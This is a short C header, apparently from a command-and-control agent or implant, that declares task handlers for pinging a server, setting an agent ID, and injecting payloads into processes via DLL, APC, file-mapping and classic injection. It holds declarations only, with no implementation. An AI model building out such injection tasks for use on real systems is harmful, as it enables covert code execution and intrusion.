#ifndef _TASK_
#define _TASK_
#include "../message/Message.h"


typedef PMESSAGE (*TaskHandler)(PBYTE payload, DWORD size);

PMESSAGE pingServer();
PMESSAGE initAgentId(PBYTE payload, DWORD size);
PMESSAGE injectViaDllTask(PBYTE payload, DWORD size);
PMESSAGE injectViaApcTask(PBYTE payload, DWORD size);
PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size);
PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size);

#endif